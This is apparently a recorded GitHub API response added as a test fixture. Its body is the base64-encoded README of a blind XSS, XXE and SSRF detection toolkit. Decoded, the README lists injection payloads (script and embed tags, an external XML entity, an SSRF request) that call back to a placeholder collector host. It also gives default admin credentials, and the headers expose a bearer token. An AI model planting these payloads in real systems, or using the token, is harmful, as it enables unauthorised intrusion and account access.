@@ -1,0 +1,33 @@
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type
+Cache-Control: private, max-age=60, s-maxage=60
+Content-Security-Policy: default-src 'none'
+Content-Type: application/json; charset=utf-8
+Date: Mon, 24 Feb 2020 11:18:38 GMT
+Etag: W/"4fe1248b8efe0cdcae7bc81f681e3a32"
+Last-Modified: Fri, 23 Aug 2019 10:50:04 GMT
+Referrer-Policy: origin-when-cross-origin, strict-origin-when-cross-origin
+Server: GitHub.com
+Status: 200 OK
+Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
+Vary: Accept, Authorization, Cookie, X-GitHub-OTP
+Vary: Accept-Encoding, Accept, X-Requested-With
+X-Accepted-Oauth-Scopes: 
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Github-Media-Type: github.v3; format=json
+X-Github-Request-Id: FFE6:981E:95A8B:B1F01:5E53B10E
+X-Oauth-Scopes: gist, notifications, read:discussion, read:enterprise, read:gpg_key, read:org, read:packages, read:public_key, read:repo_hook, read:user, repo
+X-Ratelimit-Limit: 5000
+X-Ratelimit-Remaining: 2536
+X-Ratelimit-Reset: 1582545249
+X-Varied-Accept: application/vnd.github.v3+json
+X-Varied-Authorization: Bearer 2188eea706e4318ebb792c15141e1e6c8d7b5dd4
+X-Xss-Protection: 1; mode=block
+
+a68
+{"name":"README.md","path":"README.md","sha":"9817cbb084e9308e9f72c63bea83b4253c31afe3","size":1367,"url":"https://api.github.com/repos/SpiderMate/B-XSSRF/contents/README.md?ref=master","html_url":"https://github.com/SpiderMate/B-XSSRF/blob/master/README.md","git_url":"https://api.github.com/repos/SpiderMate/B-XSSRF/git/blobs/9817cbb084e9308e9f72c63bea83b4253c31afe3","download_url":"https://raw.githubusercontent.com/SpiderMate/B-XSSRF/master/README.md","type":"file","content":"PGgxIGFsaWduPSJjZW50ZXIiPgogIDxicj4KICA8YSBocmVmPSIiPjxpbWcg\nc3JjPSJodHRwczovL2dpdGh1Yi5jb20vU3BpZGVyTWF0ZS9CLVhTU1JGL2Js\nb2IvbWFzdGVyL2ltZy9pY29uLnBuZyIgd2lkdGg9IjcwIiBoZWlnaHQ9Ijcw\nIiBhbHQ9IkItWFNTUkYiPjwvYT4KICA8YnI+CiAgQi1YU1NSRgogIDxicj4K\nPC9oMT4KCjxoNCBhbGlnbj0iY2VudGVyIj5Ub29sa2l0IHRvIGRldGVjdCBh\nbmQga2VlcCB0cmFjayBvbiBCbGluZCBYU1MsIFhYRSAmIFNTUkY8L2g0PgoK\nPHAgYWxpZ249ImNlbnRlciI+CiAgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIu\nY29tL1NwaWRlck1hdGUvUFMtRHVja3kvcmVsZWFzZXMiPgogICAgPGltZyBz\ncmM9Imh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvcmVsZWFzZS12MS4w\nLWJsdWUuc3ZnIj4KICA8L2E+CiAgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIu\nY29tL1NwaWRlck1hdGUvUFMtRHVja3kvaXNzdWVzIj4KICAgIDxpbWcgc3Jj\nPSJodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL2lzc3Vlcy0wLXJlZC5z\ndmciPgogIDwvYT4KICAgIDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9T\ncGlkZXJNYXRlL1BTLUR1Y2t5L2lzc3VlcyI+CiAgICA8aW1nIHNyYz0iaHR0\ncHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9waHAtNS1ncmVlbi5zdmciPgog\nIDwvYT4KPC9wPgoKPGltZyBzcmM9Imh0dHBzOi8vZ2l0aHViLmNvbS9TcGlk\nZXJNYXRlL0ItWFNTUkYvYmxvYi9tYXN0ZXIvaW1nL2Rhc2hib2FyZC5wbmci\nIGFsdD0iQi1YU1NSRiI+CgojIyMgU0VUVVAKLSBVcGxvYWQgdGhlIGZpbGVz\nIHRvIHlvdXIgc2VydmVyLgotIENyZWF0ZSBhIERhdGFiYXNlIGFuZCB1cGxv\nYWQgPGI+ZGF0YWJhc2Uuc3FsPC9iPiBmaWxlIHRvIGl0LgotIENoYW5nZSB0\naGUgPGI+REIgQ3JlZGVudGlhbHM8L2I+IGluIDxiPmRiLnBocDwvYj4gZmls\nZS4KLSBSZWFkeS4KCiMjIyBVU0FHRQpCTElORCBYU1MgCgpgYGAKPGVtYmVk\nIHNyYz0iaHR0cDovL215c2l0ZS5jb20vYnhzc3JmL3JlcXVlc3QucGhwIj4K\nPHNjcmlwdCBzcmM9Imh0dHA6Ly9teXNpdGUuY29tL2J4c3NyZi9yZXF1ZXN0\nLnBocCI+CmBgYApCTElORCBYWEUKCmBgYAo8P3htbCB2ZXJzaW9uPSIxLjAi\nID8+CjwhRE9DVFlQRSByb290IFsKPCFFTlRJVFkgJSBleHQgU1lTVEVNICJo\ndHRwOi8vbXlzaXRlLmNvbS9ieHNzcmYvcmVxdWVzdC5waHAiPiAlZXh0Owpd\nPgo8cj48L3I+CmBgYApTU1JGCgpgYGAKR0VUIC90ZXN0c3NyZi5waHA9aHR0\ncDovL215c2l0ZS5jb20vYnhzc3JmL3JlcXVlc3QucGhwCgpgYGAKIyMjIERF\nRkFVTFQgQ1JFREVOVElBTFMKYGBgClVTRVIgOiBhZG1pbkB0ZXN0LmNvbQpQ\nQVNTIDogMTIzNDU2CmBgYAo=\n","encoding":"base64","_links":{"self":"https://api.github.com/repos/SpiderMate/B-XSSRF/contents/README.md?ref=master","git":"https://api.github.com/repos/SpiderMate/B-XSSRF/git/blobs/9817cbb084e9308e9f72c63bea83b4253c31afe3","html":"https://github.com/SpiderMate/B-XSSRF/blob/master/README.md"}}
+0
+
